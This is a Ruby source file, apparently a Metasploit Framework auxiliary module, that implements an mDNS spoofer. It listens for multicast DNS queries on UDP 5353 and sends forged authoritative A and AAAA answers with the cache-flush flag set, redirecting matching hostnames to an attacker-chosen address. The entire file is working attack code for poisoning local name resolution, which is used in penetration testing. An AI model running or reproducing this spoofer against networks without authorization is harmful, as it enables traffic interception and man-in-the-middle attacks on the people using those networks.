##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'socket'
require 'ipaddr'
require 'net/dns'

class MetasploitModule < Msf::Auxiliary

include Msf::Exploit::Capture

attr_accessor :sock, :thread


  def initialize
    super(
      'Name'        => 'mDNS Spoofer',
      'Description' => %q{
          This module will listen for mDNS multicast requests on 5353/udp for A and AAAA record queries, and respond with a spoofed IP address (assuming the request matches our regex).
      },
      'Author'     => [ 'Joe Testa <jtesta[at]positronsecurity.com>', 'James Lee <egypt[at]metasploit.com>', 'Robin Francois <rof[at]navixia.com>' ],
      'License'    => MSF_LICENSE,
      'References' =>
        [
          [ 'URL', 'https://tools.ietf.org/html/rfc6762' ]
        ],

        'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    register_options([
      OptAddress.new('SPOOFIP4', [ true, "IPv4 address with which to spoof A-record queries", ""]),
      OptAddress.new('SPOOFIP6', [ false, "IPv6 address with which to spoof AAAA-record queries", ""]),
      OptRegexp.new('REGEX', [ true, "Regex applied to the mDNS to determine if spoofed reply is sent", '.*']),
      OptInt.new('TTL', [ false, "Time To Live for the spoofed response (in seconds)", 120]),
    ])

    deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
    self.thread = nil
    self.sock = nil
  end

  def dispatch_request(packet, rhost, src_port)
    rhost = ::IPAddr.new(rhost)

    # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped
    # addr like "::ffff:192.168.0.1" when the interface we're listening
    # on has an IPv6 address. Convert it to just the v4 addr
    if rhost.ipv4_mapped?
      rhost = rhost.native
    end

    # Parse the incoming MDNS packet.  Quit if an exception was thrown.
    dns_pkt = nil
    begin
      dns_pkt = ::Net::DNS::Packet.parse(packet)
    rescue
      return
    end

    spoof4 = ::IPAddr.new(datastore['SPOOFIP4'])
    spoof6 = ::IPAddr.new(datastore['SPOOFIP6']) rescue ''

    # Turn this packet into an authoritative response.
    dns_pkt.header.qr = 1
    dns_pkt.header.aa = 1

    qm = true
    dns_pkt.question.each do |question|
      name = question.qName
      if datastore['REGEX'] != '.*'
        unless name =~ /#{datastore['REGEX']}/i
          vprint_status("#{rhost.to_s.ljust 16} mDNS - #{name} did not match REGEX \"#{datastore['REGEX']}\"")
          next
        end
      end

      # Check if the query is the "QU" type, which implies that we need to send a unicast response, instead of a multicast response.
      if question.qClass.to_i == 32769 # = 0x8001 = Class: IN, with QU type
        qm = false
      end

      # qType is not a Integer, so to compare it with `case` we have to
      # convert it
      responding_with = nil
      case question.qType.to_i
      when ::Net::DNS::A
        dns_pkt.answer << ::Net::DNS::RR::A.new(
          :name => name,
          :ttl => datastore['TTL'],
          :cls => 0x8001, # Class IN, with flush cache flag
          :type => ::Net::DNS::A,
          :address => spoof4.to_s
        )
        responding_with = spoof4.to_s
      when ::Net::DNS::AAAA
        if spoof6 != ''
          dns_pkt.answer << ::Net::DNS::RR::AAAA.new(
            :name => name,
            :ttl => datastore['TTL'],
            :cls => 0x8001, # Class IN, with flush cache flag
            :type => ::Net::DNS::AAAA,
            :address => spoof6.to_s
          )
          responding_with = spoof6.to_s
        end
      else
        # Skip PTR, SRV, etc. records.
        next
      end

      # If we are responding to this query, and we haven't spammed stdout recently, print a notification.
      if not responding_with.nil? and should_print_reply?(name)
        print_good("#{rhost.to_s.ljust 16} mDNS - #{name} matches regex, responding with #{responding_with}")
      end
    end

    # Clear the questions from the responses.  They aren't observed in legit responses.
    dns_pkt.question.clear()

    # If we didn't find anything we want to spoof, don't send any
    # packets
    return if dns_pkt.answer.empty?

    begin
      udp = ::PacketFu::UDPHeader.new(
        :udp_src => 5353,
        :udp_dst => src_port,
        :body => dns_pkt.data
      )
    rescue
      return
    end
    udp.udp_recalc

    # Set the destination to the requesting host.  Otherwise, if this is a "QM" query, we will multicast the response.
    dst = rhost
    if rhost.ipv4?
      if qm
        dst = ::IPAddr.new('224.0.0.251')
      end
      ip_pkt = ::PacketFu::IPPacket.new(
        :ip_src => spoof4.hton,
        :ip_dst => dst.hton,
        :ip_proto => 0x11, # UDP
        :body => udp
      )
    elsif rhost.ipv6?
      if qm
        dst = ::IPAddr.new('ff02::fb')
      end
      ip_pkt = ::PacketFu::IPv6Packet.new(
        :ipv6_src => spoof6.hton,
        :ipv6_dst => dst.hton,
        :ip_proto => 0x11, # UDP
        :body => udp
      )
    else
      # Should never get here
      print_error("IP version is not 4 or 6. Failed to parse?")
      return
    end
    ip_pkt.recalc

    capture_sendto(ip_pkt, rhost.to_s, true)
  end

  def monitor_socket
    while true
      rds = [self.sock]
      wds = []
      eds = [self.sock]

      r,_,_ = ::IO.select(rds,wds,eds,0.25)

      if (r != nil and r[0] == self.sock)
        packet, host, port = self.sock.recvfrom(65535)
        dispatch_request(packet, host, port)
      end
    end
  end


  # Don't spam with success, just throttle to every 10 seconds
  # per host
  def should_print_reply?(host)
    @notified_times ||= {}
    now = Time.now.utc
    @notified_times[host] ||= now
    last_notified = now - @notified_times[host]
    if last_notified == 0 or last_notified > 10
      @notified_times[host] = now
    else
      false
    end
  end

  def run
    check_pcaprub_loaded()
    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround

    # Avoid receiving extraneous traffic on our send socket
    open_pcap({'FILTER' => 'ether host f0:f0:f0:f0:f0:f0'})

    # Multicast Address for LLMNR
    multicast_addr = ::IPAddr.new("224.0.0.251")

    # The bind address here will determine which interface we receive
    # multicast packets from. If the address is INADDR_ANY, we get them
    # from all interfaces, so try to restrict if we can, but fall back
    # if we can't
    bind_addr = get_ipv4_addr(datastore["INTERFACE"]) rescue "0.0.0.0"

    optval = multicast_addr.hton + ::IPAddr.new(bind_addr).hton
    self.sock = Rex::Socket.create_udp(
      # This must be INADDR_ANY to receive multicast packets
      'LocalHost' => "0.0.0.0",
      'LocalPort' => 5353,
      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
    )
    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    self.sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)

    self.thread = Rex::ThreadFactory.spawn("MDNSServerMonitor", false) {
      monitor_socket
    }

    print_status("mDNS spoofer started. Listening for mDNS requests with REGEX \"#{datastore['REGEX']}\" ...")

    add_socket(self.sock)

    self.thread.join
  end

  def cleanup
    if self.thread and self.thread.alive?
      self.thread.kill
      self.thread = nil
    end
    close_pcap
  end
end
